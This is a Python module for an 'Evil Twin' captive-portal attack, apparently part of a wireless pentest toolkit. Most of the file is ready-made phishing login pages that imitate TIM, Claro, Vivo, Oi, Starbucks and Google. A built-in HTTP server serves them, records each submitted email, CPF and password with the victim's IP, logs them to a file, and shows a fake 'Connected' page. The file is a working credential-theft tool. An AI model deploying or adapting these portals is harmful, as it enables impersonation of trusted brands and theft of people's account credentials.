"""Evil Twin Portal Manager - captive portal server with built-in templates.

Manages HTML portal templates for Evil Twin / captive portal engagements.
Serves portals via Python's built-in http.server (no Flask/FastAPI dependency).
Captured credentials are written to a timestamped local log file.

Built-in templates:
  - generic_wifi: Generic ISP/hotspot login (neutral branding)
  - router_admin: Generic router admin panel
  - isp_tim: TIM Brasil login portal
  - isp_claro: Claro Brasil login portal
  - isp_vivo: Vivo Brasil login portal
  - isp_oi: Oi Brasil login portal
  - starbucks: Starbucks WiFi portal (from wifi-arsenal_6)
  - google: Google account login (from wifi-arsenal_6)

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import io
import json
import logging
import threading
import time
import urllib.parse
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Built-in portal templates
# ---------------------------------------------------------------------------

_TEMPLATES: dict[str, str] = {}

_TEMPLATES["generic_wifi"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#1a73e8;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:40px;max-width:400px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
h1{color:#1a73e8;text-align:center;margin-bottom:8px;font-size:22px}
p{color:#666;text-align:center;margin-bottom:24px;font-size:13px}
input{width:100%;padding:11px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px;outline:none}
input:focus{border-color:#1a73e8}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}
button:hover{background:#1557b0}
.note{font-size:11px;color:#999;text-align:center;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <h1>WiFi Access</h1>
  <p>Enter your credentials to connect to the network</p>
  <form action="/submit" method="POST">
    <input type="email" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
  <p class="note">By connecting you agree to the acceptable use policy</p>
</div>
</body>
</html>"""

_TEMPLATES["router_admin"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#2c3e50;display:flex;
  justify-content:center;align-items:center;min-height:100vh}
.box{background:#ecf0f1;border-radius:8px;padding:36px;width:340px;
  box-shadow:0 6px 24px rgba(0,0,0,.4)}
.brand{text-align:center;font-size:28px;font-weight:700;color:#2c3e50;
  margin-bottom:4px}
.sub{text-align:center;color:#7f8c8d;font-size:12px;margin-bottom:28px}
label{display:block;font-size:12px;color:#555;margin-bottom:4px;font-weight:600}
input{width:100%;padding:10px;margin-bottom:16px;border:1px solid #bdc3c7;
  border-radius:4px;font-size:14px}
input:focus{border-color:#3498db;outline:none}
button{width:100%;padding:11px;background:#3498db;color:#fff;border:none;
  border-radius:4px;font-size:14px;cursor:pointer;font-weight:600}
button:hover{background:#2980b9}
</style>
</head>
<body>
<div class="box">
  <div class="brand">&#128274; Admin Panel</div>
  <div class="sub">Router Administration Console</div>
  <form action="/submit" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="admin" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>"""

_TEMPLATES["isp_tim"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TIM - Acesso Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#005aad;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:36px;font-weight:900;color:#005aad;
  letter-spacing:-1px;margin-bottom:4px}
.logo span{color:#e40c0c}
h2{text-align:center;color:#333;font-size:16px;font-weight:400;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ccc;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#005aad;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#004080}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">T<span>IM</span></div>
  <h2>Acesso ao Wi-Fi TIM</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail cadastrado" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
  </form>
  <p class="footer">Ao continuar, voce aceita os Termos de Uso TIM</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_claro"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Claro - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e2001a;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:32px;font-weight:900;color:#e2001a;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#e2001a;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#b0000e}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Claro</div>
  <h2>Conecte-se ao Wi-Fi Claro</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail Claro" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Conectar</button>
  </form>
  <p class="footer">Ao conectar, voce concorda com os Termos de Uso Claro</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_vivo"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vivo - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#660099;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:32px;font-weight:900;color:#660099;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#660099;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#4a0070}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Vivo</div>
  <h2>Portal de Acesso Wi-Fi Vivo</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou telefone Vivo" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Acessar</button>
  </form>
  <p class="footer">Conectando voce aceita os Termos de Uso Vivo</p>
</div>
</body>
</html>"""

_TEMPLATES["isp_oi"] = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Oi - Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5a623;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:10px;padding:36px;max-width:380px;
  width:100%;box-shadow:0 4px 20px rgba(0,0,0,.2)}
.logo{text-align:center;font-size:42px;font-weight:900;color:#f5a623;
  margin-bottom:4px}
h2{text-align:center;color:#444;font-size:15px;margin-bottom:24px}
input{width:100%;padding:12px;margin-bottom:14px;border:1px solid #ddd;
  border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#f5a623;color:#fff;border:none;
  border-radius:6px;font-size:15px;cursor:pointer;font-weight:700}
button:hover{background:#d48b10}
.footer{font-size:11px;color:#999;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Oi</div>
  <h2>Acesso Wi-Fi Oi</h2>
  <form action="/submit" method="POST">
    <input type="text" name="cpf" placeholder="CPF ou e-mail Oi" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
  </form>
  <p class="footer">Ao continuar, voce concorda com os Termos de Uso Oi</p>
</div>
</body>
</html>"""

_TEMPLATES["starbucks"] = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Starbucks WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#00704A;display:flex;
  justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{background:#fff;border-radius:10px;padding:40px;max-width:400px;
  width:100%;box-shadow:0 4px 6px rgba(0,0,0,.1)}
.logo{text-align:center;font-size:48px;margin-bottom:20px}
h1{color:#00704A;text-align:center;margin-bottom:10px;font-size:24px}
p{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;
  border-radius:5px;font-size:14px}
button{width:100%;padding:12px;background:#00704A;color:#fff;border:none;
  border-radius:5px;font-size:16px;cursor:pointer;font-weight:700}
button:hover{background:#005a3c}
.terms{font-size:12px;color:#999;text-align:center;margin-top:20px}
</style>
</head>
<body>
<div class="container">
  <div class="logo">&#9749;</div>
  <h1>Welcome to Starbucks WiFi</h1>
  <p>Please sign in to access complimentary WiFi</p>
  <form action="/submit" method="POST">
    <input type="email" name="email" placeholder="Email Address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
  <p class="terms">By connecting, you agree to our Terms of Service</p>
</div>
</body>
</html>"""

_TEMPLATES["google"] = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,maximum-scale=1,initial-scale=1">
<title>Google - Sign in</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;
  min-height:100vh;background:#f1f1f1}
.login-container{background:#fff;padding:28px;border-radius:8px;
  width:360px;box-shadow:0 2px 10px rgba(0,0,0,.12)}
#logo{display:block;margin:0 auto 20px}
h1{text-align:center;margin-bottom:20px;font-size:22px;color:#202124}
h2{text-align:center;margin-bottom:20px;font-size:15px;color:#444;font-weight:400}
.g-input{display:block;width:100%;padding:11px;margin-bottom:12px;
  border:1px solid #ddd;border-radius:5px;font-size:14px}
.g-input:focus{border-color:#1a73e8;outline:none}
.gbtn-primary{display:block;width:100%;padding:11px;border:none;
  border-radius:5px;background:#1a73e8;color:#fff;cursor:pointer;
  font-size:14px;font-weight:600}
.gbtn-primary:hover{background:#1557b0}
</style>
</head>
<body>
<div class="login-container">
  <svg id="logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
  </svg>
  <h1>Sign in</h1>
  <h2>Use your Google Account</h2>
  <form action="/submit" method="POST">
    <input name="email" type="text" class="g-input" placeholder="Email" required>
    <input name="password" type="password" class="g-input" placeholder="Password" required>
    <button class="gbtn-primary" type="submit">Next</button>
  </form>
</div>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Capture log entry
# ---------------------------------------------------------------------------

class _CaptureEntry:
    __slots__ = ("timestamp", "remote_addr", "data")

    def __init__(self, remote_addr: str, data: dict[str, str]) -> None:
        self.timestamp = datetime.now(timezone.utc).isoformat()
        self.remote_addr = remote_addr
        self.data = data


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------

def _make_handler(template_html: str, manager: "PortalManager") -> type:
    """Factory that builds a BaseHTTPRequestHandler bound to a specific template."""

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt: str, *args: Any) -> None:
            logger.debug("[PortalServer] " + fmt, *args)

        def _send_html(self, code: int, body: str) -> None:
            encoded = body.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(encoded)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(encoded)

        def do_GET(self) -> None:
            self._send_html(200, template_html)

        def do_POST(self) -> None:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", errors="replace")
            fields: dict[str, str] = {}
            for part in body.split("&"):
                if "=" in part:
                    k, _, v = part.partition("=")
                    fields[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)

            remote = self.client_address[0]
            entry = _CaptureEntry(remote_addr=remote, data=fields)
            manager._record_capture(entry)

            self._send_html(200, _SUCCESS_PAGE)

    return _Handler


_SUCCESS_PAGE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>body{font-family:Arial;text-align:center;padding-top:80px;
  background:#1a1a1a;color:#fff}h1{color:#27ae60}</style>
</head><body>
<h1>&#10003; Connected</h1>
<p>You are now connected to the network.</p>
<p style="color:#888;font-size:13px">Enjoy your browsing session</p>
</body></html>"""


# ---------------------------------------------------------------------------
# Portal Manager
# ---------------------------------------------------------------------------

class PortalManager:
    """Evil Twin captive portal manager.

    Manages built-in portal templates and optionally serves them via Python's
    built-in HTTP server. Captured credentials are written to a log file.

    No Flask, FastAPI, or other external web framework is required.

    Args:
        log_dir: Directory where credential captures are written.
            Ignored in simulate mode.
        simulate: When True, the server starts but credential captures are
            only logged via the logging module, not written to disk.
        on_capture: Optional callback invoked with each captured credential dict.
    """

    def __init__(
        self,
        log_dir: Optional[str | Path] = None,
        simulate: bool = True,
        on_capture: Optional[Callable[[dict[str, Any]], None]] = None,
    ) -> None:
        self.simulate = simulate
        self.on_capture = on_capture
        self._captures: list[_CaptureEntry] = []
        self._lock = threading.Lock()
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._log_path: Optional[Path] = None

        if not simulate and log_dir is not None:
            self._log_path = Path(log_dir).resolve()
            self._log_path.mkdir(parents=True, exist_ok=True)
            self._log_path = (
                self._log_path
                / f"captures_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl"
            )

    # ------------------------------------------------------------------
    # Template access
    # ------------------------------------------------------------------

    @staticmethod
    def list_templates() -> list[str]:
        """List all available template names.

        Returns:
            Sorted list of template identifiers.
        """
        return sorted(_TEMPLATES.keys())

    @staticmethod
    def get_template(name: str) -> str:
        """Return the HTML content for a named template.

        Args:
            name: Template identifier (see list_templates()).

        Returns:
            Self-contained HTML string.

        Raises:
            KeyError: If the template name is not found.
        """
        if name not in _TEMPLATES:
            available = ", ".join(sorted(_TEMPLATES.keys()))
            raise KeyError(f"Template '{name}' not found. Available: {available}")
        return _TEMPLATES[name]

    @staticmethod
    def add_template(name: str, html: str) -> None:
        """Register a custom template at runtime.

        Args:
            name: Unique template identifier.
            html: Self-contained HTML content.
        """
        if not name or not html:
            raise ValueError("name and html must be non-empty strings")
        _TEMPLATES[name] = html
        logger.info("[PortalManager] Custom template registered: %s", name)

    # ------------------------------------------------------------------
    # Credential capture
    # ------------------------------------------------------------------

    def _record_capture(self, entry: _CaptureEntry) -> None:
        with self._lock:
            self._captures.append(entry)

        payload = {
            "timestamp": entry.timestamp,
            "remote_addr": entry.remote_addr,
            "fields": entry.data,
        }

        logger.info("[PortalManager] CAPTURE from %s: %s", entry.remote_addr,
                    list(entry.data.keys()))

        if self.on_capture:
            from contextlib import suppress as _suppress
            with _suppress(Exception):
                self.on_capture(payload)

        if self.simulate:
            logger.info("[PortalManager] simulate=True - capture not written to disk")
            return

        if self._log_path:
            try:
                with open(str(self._log_path), "a", encoding="utf-8") as fh:
                    fh.write(json.dumps(payload) + "\n")
            except Exception as exc:
                logger.error("[PortalManager] Failed to write capture log: %s", exc)

    # ------------------------------------------------------------------
    # Server lifecycle
    # ------------------------------------------------------------------

    def start_server(self, template_name: str = "generic_wifi", port: int = 8080) -> bool:
        """Start the captive portal HTTP server.

        Args:
            template_name: Template to serve (see list_templates()).
            port: TCP port to listen on. Use 80 for real deployments
                (requires root/CAP_NET_BIND_SERVICE on Linux).

        Returns:
            True if the server started successfully.
        """
        if self._server is not None:
            logger.warning("[PortalManager] Server already running")
            return False

        try:
            html = self.get_template(template_name)
        except KeyError as exc:
            logger.error("[PortalManager] %s", exc)
            return False

        handler = _make_handler(html, self)

        try:
            self._server = HTTPServer(("0.0.0.0", port), handler)
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            mode = "simulate" if self.simulate else "active"
            logger.info(
                "[PortalManager] Portal server started on port %d template='%s' mode=%s",
                port, template_name, mode,
            )
            return True
        except OSError as exc:
            logger.error("[PortalManager] Cannot bind port %d: %s", port, exc)
            self._server = None
            return False

    def stop_server(self) -> None:
        """Shut down the portal HTTP server."""
        if self._server:
            self._server.shutdown()
            self._server = None
            logger.info("[PortalManager] Portal server stopped")

    # ------------------------------------------------------------------
    # Credential access
    # ------------------------------------------------------------------

    @property
    def captures(self) -> list[dict[str, Any]]:
        """All captured credential submissions as a list of dicts."""
        with self._lock:
            return [
                {
                    "timestamp": e.timestamp,
                    "remote_addr": e.remote_addr,
                    "fields": e.data,
                }
                for e in self._captures
            ]

    def export_captures(self, path: str | Path) -> str:
        """Export captured credentials to a JSONL file.

        Args:
            path: Output file path.

        Returns:
            Absolute path of the written file.
        """
        out = Path(path).resolve()
        out.parent.mkdir(parents=True, exist_ok=True)

        if self.simulate:
            logger.info("[PortalManager] simulate=True - skipping export to %s", out)
            return str(out)

        with self._lock:
            entries = list(self._captures)

        with open(str(out), "w", encoding="utf-8") as fh:
            for e in entries:
                fh.write(
                    json.dumps({
                        "timestamp": e.timestamp,
                        "remote_addr": e.remote_addr,
                        "fields": e.data,
                    }) + "\n"
                )

        logger.info("[PortalManager] Exported %d captures to %s", len(entries), out)
        return str(out)

    def summary(self) -> dict[str, Any]:
        """Return a summary of portal activity."""
        with self._lock:
            total = len(self._captures)
            unique_ips = len({e.remote_addr for e in self._captures})
        return {
            "total_captures": total,
            "unique_source_ips": unique_ips,
            "server_running": self._server is not None,
            "simulate": self.simulate,
            "log_path": str(self._log_path) if self._log_path else None,
        }
